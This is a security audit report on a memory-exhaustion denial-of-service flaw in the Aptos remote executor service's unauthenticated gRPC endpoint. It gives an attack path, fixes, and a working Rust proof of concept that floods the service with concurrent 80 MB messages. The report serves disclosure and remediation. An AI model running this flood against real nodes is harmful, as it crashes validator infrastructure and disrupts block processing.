# Audit Report

## Title
Unbounded Memory Exhaustion via Concurrent Large NetworkMessage Flooding in Remote Executor Service

## Summary
The remote executor service's gRPC endpoint accepts NetworkMessage instances up to 80 MB without concurrency limits or authentication, forwarding them to unbounded channels. An attacker can send thousands of concurrent large messages to exhaust heap memory and crash executor service nodes.

## Finding Description

The `NetworkMessage` struct is defined with unbounded fields: [1](#0-0) 

The gRPC server implementation sets a maximum message size of 80 MB but lacks concurrency controls: [2](#0-1) [3](#0-2) 

The server configuration only sets timeout and max message sizeâ€”no `concurrency_limit_per_connection`, rate limiting, or authentication. Incoming messages are forwarded to unbounded channels: [4](#0-3) [5](#0-4) 

**Attack Path:**
1. Attacker connects to the executor service's gRPC endpoint (no authentication required)
2. Opens multiple HTTP/2 connections (or uses multiple streams on one connection)
3. Sends concurrent requests with 80 MB `NetworkMessage` payloads
4. Each message is decoded and sent to unbounded channel via `handler.send(msg).unwrap()`
5. If messages arrive faster than processing (or consumer is deliberately slow), they accumulate in memory
6. With 100 concurrent requests at 80 MB each = 8 GB immediate memory allocation
7. Continued flooding exhausts available heap memory
8. Process triggers OOM and crashes

This breaks **Resource Limits invariant**: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This qualifies as **High Severity** under the Aptos bug bounty program criteria:

- **Validator node crashes**: Executor service nodes crash due to OOM, causing validator infrastructure unavailability
- **Service disruption**: Sharded block execution becomes unavailable, impacting blockchain operation
- **No authentication barrier**: Any network-accessible attacker can exploit this

The remote executor service is deployed as a standalone process for sharded execution: [6](#0-5) 

A crash of executor shards disrupts block processing and consensus finalization.

## Likelihood Explanation

**Likelihood: High**

- **No authentication required**: Service has no auth checks
- **Simple exploitation**: Standard gRPC clients can flood the endpoint
- **Low resource cost for attacker**: 100 concurrent connections is trivial
- **Deployment exposure**: Service listens on configurable SocketAddr (may be network-accessible) [7](#0-6) 

## Recommendation

Implement multiple defense layers:

**1. Add concurrency limits to gRPC server:**
```rust
Server::builder()
    .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
    .concurrency_limit_per_connection(10) // Limit concurrent streams per connection
    .initial_connection_window_size(1024 * 1024) // Limit connection window
    .add_service(
        NetworkMessageServiceServer::new(self)
            .max_decoding_message_size(MAX_MESSAGE_SIZE)
    )
    // ...
```

**2. Replace unbounded channels with bounded channels:**
```rust
// In network_controller/mod.rs
pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
    let (inbound_sender, inbound_receiver) = crossbeam_channel::bounded(100); // Bound at 100 messages
    // ...
}
```

**3. Add authentication/authorization** using mTLS or token-based auth for service-to-service communication

**4. Implement rate limiting** at the application layer to reject excessive requests from same source

## Proof of Concept

```rust
// PoC: Flood remote executor service with large messages
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tokio::task::JoinSet;

#[tokio::main]
async fn main() {
    let target_addr = "http://127.0.0.1:50051"; // Executor service address
    let concurrent_requests = 100;
    let message_size = 80 * 1024 * 1024; // 80 MB
    
    let mut join_set = JoinSet::new();
    
    // Spawn concurrent attack tasks
    for i in 0..concurrent_requests {
        let addr = target_addr.to_string();
        join_set.spawn(async move {
            let mut client = NetworkMessageServiceClient::connect(addr)
                .await
                .expect("Failed to connect");
            
            loop {
                let request = NetworkMessage {
                    message: vec![0u8; message_size], // 80 MB payload
                    message_type: format!("attack_{}", i),
                };
                
                // Keep flooding
                if client.simple_msg_exchange(request).await.is_err() {
                    break; // Service crashed or connection lost
                }
            }
        });
    }
    
    // Wait for all attack tasks
    while let Some(_) = join_set.join_next().await {}
}
```

**Expected result**: Executor service process crashes with OOM error after accumulating several GB of messages in unbounded channels.

---

## Notes

This vulnerability is specific to the remote executor service's `NetworkMessageService` gRPC endpoint. The Aptos network framework's RPC protocol (used for consensus messaging) has proper concurrency limits (`MAX_CONCURRENT_INBOUND_RPCS = 100`), but the executor service uses a separate gRPC implementation without these protections. The 80 MB message size limit alone is insufficient protection against memory exhaustion when combined with unbounded concurrency and unbounded queues.

### Citations

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L8-13)
```rust
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L23-23)
```rust
const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 80;
```

**File:** secure/net/src/grpc_network_service/mod.rs (L75-87)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
        info!("Server shutdown at {:?}", server_addr);
```

**File:** secure/net/src/grpc_network_service/mod.rs (L92-116)
```rust
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** secure/net/src/network_controller/mod.rs (L128-137)
```rust
    pub fn create_inbound_channel(&mut self, message_type: String) -> Receiver<Message> {
        let (inbound_sender, inbound_receiver) = unbounded();

        self.inbound_handler
            .lock()
            .unwrap()
            .register_handler(message_type, inbound_sender);

        inbound_receiver
    }
```

**File:** execution/executor-service/src/process_executor_service.rs (L16-45)
```rust
impl ProcessExecutorService {
    pub fn new(
        shard_id: ShardId,
        num_shards: usize,
        num_threads: usize,
        coordinator_address: SocketAddr,
        remote_shard_addresses: Vec<SocketAddr>,
    ) -> Self {
        let self_address = remote_shard_addresses[shard_id];
        info!(
            "Starting process remote executor service on {}; coordinator address: {}, other shard addresses: {:?}; num threads: {}",
            self_address, coordinator_address, remote_shard_addresses, num_threads
        );
        aptos_node_resource_metrics::register_node_metrics_collector(None);
        let _mp = MetricsPusher::start_for_local_run(
            &("remote-executor-service-".to_owned() + &shard_id.to_string()),
        );

        AptosVM::set_concurrency_level_once(num_threads);
        let mut executor_service = ExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            self_address,
            coordinator_address,
            remote_shard_addresses,
        );
        executor_service.start();
        Self { executor_service }
    }
```

**File:** execution/executor-service/src/main.rs (L9-25)
```rust
#[derive(Debug, Parser)]
struct Args {
    #[clap(long, default_value_t = 8)]
    pub num_executor_threads: usize,

    #[clap(long)]
    pub shard_id: usize,

    #[clap(long)]
    pub num_shards: usize,

    #[clap(long, num_args = 1..)]
    pub remote_executor_addresses: Vec<SocketAddr>,

    #[clap(long)]
    pub coordinator_address: SocketAddr,
}
```
